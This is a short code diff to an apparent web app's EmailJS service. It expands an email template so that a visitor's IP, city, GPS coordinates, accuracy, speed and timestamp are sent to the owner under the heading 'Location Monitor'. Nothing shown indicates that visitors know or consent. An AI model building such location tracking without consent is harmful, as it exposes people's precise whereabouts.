@@ -14,7 +14,24 @@ export class EmailJSService {
 
   sendEmail(message: any) {
     const templateParams = {
-      message: `New visit with ip ${message.ip} from ${message.city} \n Co-ordinate: ${message.location}`
+      message1: `New visit with ip ${message.ip} from ${message.city} \n Co-ordinate: ${message.location}`,
+      message: `Hello,
+
+A location has been detected successfully.
+
+📍 LOCATION DETAILS
+────────────────────
+City       : ${message.city}
+IP         : ${message.ip}
+Coordinates: ${message.lat}, ${message.long}
+Accuracy   : ${message.acc} m
+Speed      : ${message.speed ?? 'Not available'}
+Ip detected address    : ${message.location}
+
+Detected   : ${message.timestamp}
+
+Regards,
+Location Monitor`
     };
 
     return emailjs.send(
